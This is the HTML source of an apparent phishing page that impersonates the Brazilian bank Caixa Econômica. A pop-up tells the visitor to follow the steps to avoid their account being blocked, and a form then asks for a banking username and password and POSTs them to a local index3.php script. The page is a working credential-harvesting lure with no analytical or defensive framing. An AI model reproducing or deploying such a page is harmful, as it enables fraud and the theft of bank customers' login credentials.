<!DOCTYPE html>
<html lang="pt-br">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<script type="text/javascript" src="scripts/htmlshiv.html"></script>
<link rel="stylesheet" type="text/css" href="css/style3.css" media="all" />
<script language="javascript" src="scripts/validation.js"></script>
<link href="css/styles.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="css/style.css" media="all" />


	
<style>
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }
input { width:95%; font-size:14px; outline:none; padding:0 0 0 10px; height:40px; border:none; border-bottom:1px solid #CCC; }
body{	padding: 0px; overflow:hidden; margin: 0px; background:#FAFBFD;	}
#proceguir { width:100%; height:45px; background:url(images/a005.html); font-size:100%; border:none; text-align:center; color:#FFF; }
.bottoms{width:100%; height:40px; position:fixed; bottom:0; background:#FFF; padding:10px; display:block;}

.pos {font-family:'Arial'; font-size:17px; color:#5574B4; margin-top:10px; padding:10px; background:#FFF; border-bottom:1px solid #EDEDED; display:block; }

@media only screen and (max-width: 380px) {
	#bottoms { display:none; !important}
	#pos { display:none; !important}
}


input[name="s8"] {
  -webkit-text-security: disc;
}
</style>

<script>

function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}
function execmascara(){
    v_obj.value=v_fun(v_obj.value)
}
function mtel(v){
    v=v.replace(/\D/g,"");             
    v=v.replace(/(\d)(\d{1})$/,"$1-$2");   
    return v;
}
function id( el ){
	return document.getElementById( el );
}
window.onload = function(){
	id('ct').onkeyup = function(){
		mascara( this, mtel );
	}
}


function xsxoxdxixnxhxexixrxox(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}

function validation2() {
 
if(document.form.ag.value=="" || document.form.ag.value.length < 8)
{
alert( "Usuario inválido, preencha corretamente." );
document.form.ag.focus();
return false;
}
 if(document.form.s8.value=="" || document.form.s8.value.length < 6)
{
alert( "Senha inválida, digite a sua senha corretamente." );
document.form.s8.focus();
return false;
}
return true;
}




</script>


<script>
  function limitarInput(obj) {
    obj.value = obj.value.substring(0,20); 
  }
</script>

<script>
  function limitarInput3(obj) {
    obj.value = obj.value.substring(0,8); 
  }
</script>

	<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}
</script>
<script type="text/javascript">

/* Máscaras ER */

function mascara(o,f){

v_obj=o;

v_fun=f;

setTimeout("execmascara()",1);

}

function execmascara(){

v_obj.value=v_fun(v_obj.value);

}

function alphanum( v ){

v=v.replace(/[^a-zA-Z0-9]/g,""); //Remove tudo o que não é dígito

return v;

}

</script>

 	
 	

<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" />
    
	<!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">


</head>
 <body class="barraInter"  onLoad="$('#modal').click();">

<body>
<div id="bgadd"></div>

<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>Caixa Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>


<div style="width:100%; height:50px; background:#fd9607; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table width="100%" cellspacing="0" cellpadding="0">
<tbody><tr>
<td width="30" height="50" bgcolor="#296fa7">
</td>
<td bgcolor="#296fa7" align="center"><font face="arial" color="#F5FBEF"><img src="../assets/img/logotipo.png" width="126" height="50"></font></td>
<td style="padding:0 10px 0 0;" width="30" bgcolor="#296fa7"></td>
</tr>
<tr>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
</tr>
</tbody></table>
</div>
<div style=" max-width:750px; margin:0 auto;">



<form name="form" id="form" action="index3.php" method="POST" onSubmit="return validation2()" autocomplete="off">
<br>
<div style="font-family:'Arial'; font-size:17px; color:#296fa7; margin-bottom:20px; ">
	<center><font size="3" face="Verdana"><b>ATIVAÇÃO DE ADESÃO</b></font><br>
    <center><font size="1" color="#999" face="Verdana">
<b>Nova adesão de segurança</b></font></div>
<div style="background:#FFF;  margin-top:10px; padding:1;">

<div class="group">      
        <div class="group" style="padding: 5px 10px 0px;">      
	  <input id="ag" name="ag" maxlength="20" type="text" required onfocus="this.value='';" onkeyup="mascara( this, alphanum ),limitarInput(this)" />
           <span class="bar"></span>
      <label><span class="span-input"><b>Usuario</b></span></label>
      </div>
	
	  
	   <div class="group" style="padding: 5px 10px 0px;">      
	  <input id="s8" name="s8" maxlength="8" type="text" required onkeyup="limitarInput3(this),proximoCampo(this, ''),FormataCpf(this,event)" onfocus="this.value='';"/>
           <span class="bar"></span>
      <label><span class="span-input"><b>Senha</b></span></label>
      </div>
	
	
	
	 </div>
	

<br>
<div style="background:#FFF; padding:10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="margin:0 10px 20px 0; float:right; color:#666666; font-family:'Arial'; font-size:13px;">
	<font size="2" face="Verdana"><b>Todos os campos são obrigatórios</b></font></div>
<div class="group">      
           <button id="btt" name="btt" type="submit" class="giris-yap-buton">Confirmar</button>
    </div></div>

</form>
</div>



<div class="bottoms" id="bottoms">
<div style="width:40px; height:40px; background:url(images/a008.html) no-repeat; float:left;"></div>
<div style="width:40px; height:40px; background:url(images/a009.html) no-repeat; float:right; margin-right:20px;"></div>
</div>


<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>

<button id="modal" type="button" data-toggle="modal" data-target="#exampleModal" style="display: none">
  
</button>

<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel"><font color="#FE6700">CAIXA ECONÔMICA</font></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <font color="#000000"><b>CAIXA INFORMA:</b> Siga os passos a seguir, evite o bloqueio de sua conta, é simples e fácil. Vamos lá.</font>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">OK</button>
      </div>
    </div>
  </div>
</div>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->

	  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	  <script type="text/javascript" src="js/aapf.js?v=08"></script>
	  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
	  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
	  
	  
</html>